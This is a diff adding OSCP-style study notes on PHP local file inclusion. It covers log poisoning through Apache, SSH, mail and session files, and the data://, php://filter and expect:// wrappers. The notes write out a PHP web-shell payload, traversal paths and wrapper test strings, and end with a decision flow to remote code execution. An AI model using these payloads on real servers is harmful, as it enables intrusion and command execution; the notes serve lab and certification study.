@@ -98,11 +98,122 @@ Reverse shell — direct, no files needed, works when you already have code exec
 
 Msfvenom — generates a payload file (exe, dll, php, etc) that you transfer to the target and execute. More powerful but requires getting a file onto the machine first.
 
+
+**When to inject PHP:**
+When you've confirmed LFI. If the server is just doing directory traversal (reading files), injecting PHP does nothing. But if LFI is confirmed — meaning the server *executes* included files — then PHP injection becomes viable.
+
+**Why logs specifically:**
+
+You need to get your PHP code into a file that:
+1. You can **write to** indirectly
+2. The server will **include and execute** via LFI
+
+Logs are perfect because:
+- The server writes your User-Agent to the log automatically — you control that input
+- Log files are predictable locations (`/var/log/apache2/access.log`, `C:\xampp\apache\logs\access.log`)
+- The server has permission to read its own logs
+
+Other places you can inject PHP if logs aren't available:
+- **File upload** — upload a PHP file disguised as an image
+- **SSH log** (`/var/log/auth.log`) — inject via SSH username field
+- **Email logs** — if the server processes email
+
+The pattern is always: find something **you control that gets written to a file**, then use LFI to execute it.
+
+Does that click now?
+
+---
+
+### Log poisoning 
+
+**The problem:**
+LFI lets you include files, but you need PHP code inside a file on the server to get execution. You can't upload files directly.
+
+**The solution:**
+Apache automatically logs every request to `access.log`, including the **User-Agent header**. You control what's in the User-Agent.
+
+**The chain:**
+
+1. You send a request with `User-Agent: <?php echo system($_GET['cmd']); ?>`
+2. Apache writes to its log: `192.168.45.194 - - "GET /page HTTP/1.1" 200 ... "<?php echo system($_GET['cmd']); ?>"`
+3. Your PHP code is now sitting inside `/var/log/apache2/access.log`
+4. You use LFI to include the log file: `?page=../../../var/log/apache2/access.log&cmd=id`
+5. The server includes the log file, PHP sees your code inside it, and executes it
+
+**Why User-Agent specifically?**
+Because it's the easiest header to modify that gets written to the log file. You could also poison other log fields, but User-Agent is the most reliable and commonly demonstrated method.
+
+**Why not just put PHP in the URL parameter?**
+The URL parameter value goes through the `page` include function — it would try to load your PHP code as a filename, not execute it. The log file is the middleman that stores your code in a real file that LFI can then include and execute.
+
+---
+
+### SSH poisoning
+
+**Step 1 — Attempt SSH login with PHP as the username:**
+```bash
+ssh '<?php echo system($_GET["cmd"]); ?>'@<target_ip>
+```
+
+The login will fail — that's fine. You don't need to get in.
+
+**Step 2 — What happens on the server:**
+SSH logs the failed attempt to `/var/log/auth.log`:
+```
+Failed password for <?php echo system($_GET["cmd"]); ?> from 192.168.45.194 port 22
+```
+
+Your PHP code is now sitting inside the auth log file.
+
+**Step 3 — Use LFI to include the log:**
+```
+?page=../../../var/log/auth.log&cmd=id
+```
+
+PHP sees the code inside the log file and executes it. You now have command execution.
+
+**When to use SSH log poisoning over Apache log poisoning:**
+- Apache logs are blocked or unreadable by `www-data`
+- You already tried Apache logs and got nothing
+- Port 22 is open on the target
+
+**Important warnings:**
+- Only attempt **one** SSH login with the payload. Every failed attempt adds another copy of your PHP code to the log. Multiple copies can corrupt the log and break execution.
+- Use single quotes around the payload in bash so your local shell doesn't interpret the `$_GET` variable
+- If you mess up the log with bad syntax, the log file becomes unparseable and this technique is dead for that target
+
+**The key difference from Apache log poisoning:**
+With Apache, you poison via User-Agent header in Burp. With SSH, you poison via the username field from your terminal. Different entry point, same result — PHP code in a log file that LFI executes.
+
+---
+
+### Others LFI poisoning
+
+**Mail logs** (`/var/log/mail.log`):
+If SMTP is running, send an email with PHP code in the subject or body. The mail server logs it, then include via LFI.
+
+**`/proc/self/environ`:**
+This file contains environment variables of the current process, including the User-Agent from the HTTP request. If readable via LFI, your poisoned User-Agent executes directly without needing a separate poisoning step.
+
+> readable meaning having read access
+
+**PHP session files** (`/tmp/sess_<session_id>`):
+If you can control any value stored in your PHP session, that value gets written to the session file on disk. Include the session file via LFI to execute it.
+
+**Priority order for OSCP:**
+1. Apache access log — most common
+2. SSH auth log — good fallback
+3. `/proc/self/environ` — quick if readable
+4. PHP session files — situational
+
+But remember — before any log poisoning, always try `data://` and `php://` wrappers first. They're simpler and require no poisoning step.
+
 ---
 
 ### Server (sidenote)
 Linux system -> Apache Server
 Windows system -> XAMPP (Apache + MySQL + php)
+
 
 ---
 
@@ -153,6 +264,13 @@ Just try them. If data:// executes your PHP, wrappers are enabled. If not, fall 
 
 ---
 
+1. Confirm directory traversal — can you read /etc/passwd?
+2. Try PHP wrappers first — data:// and php://filter are simpler  and faster than log poisoning
+3. If data:// executes code → you have RCE without needing log poisoning at all
+4. If wrappers are blocked → then fall back to log poisoning
+
+---
+
 ## 9.2.3 Remote File Inclusion (RFI)
 
 RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB.
@@ -195,6 +313,52 @@ So for a Windows web target with PowerShell — you typically do both:
 
 Base64 encode the PowerShell payload
 URL encode the powershell -enc <base64> command before passing via cmd=
+
+
+
+**LFI conditions:**
+1. A parameter that includes files dynamically (`?page=`, `?file=`, `?template=`)
+2. The server **executes** included content, not just displays it
+3. The backend language is PHP (most common for LFI)
+
+**How to confirm LFI vs plain directory traversal:**
+- Directory traversal: `?page=../../../etc/passwd` → shows file contents as text
+- LFI: the same thing works, BUT if you include a file containing PHP code, it **executes** rather than displaying the raw code
+
+**PHP wrapper conditions:**
+
+**`data://`**
+- LFI must exist
+- `allow_url_include = On` in PHP config (disabled by default)
+- Test: `?page=data://text/plain,<?php echo system('id'); ?>`
+- If you see `uid=33(www-data)` → it works
+- If blank or error → disabled, move on
+
+**`php://filter`**
+- LFI must exist
+- Works by **default** — no special config needed
+- Doesn't give you execution — gives you base64 encoded source code
+- Test: `?page=php://filter/convert.base64-encode/resource=index.php`
+- Useful for reading PHP source code to find hardcoded credentials
+
+**`expect://`**
+- LFI must exist
+- Requires `expect` PHP extension installed (very rare)
+- Test: `?page=expect://id`
+- Almost never works but worth one quick try
+
+**Decision flow:**
+```
+Found ?page= parameter
+  ↓
+Try data:// → executes? → RCE
+  ↓
+No → try php://filter → read source code for credentials
+  ↓
+No useful creds → log poisoning
+```
+
+One sentence: `data://` needs a special config enabled, `php://filter` works almost everywhere but only reads files, log poisoning works when both fail.
 
 
 ---
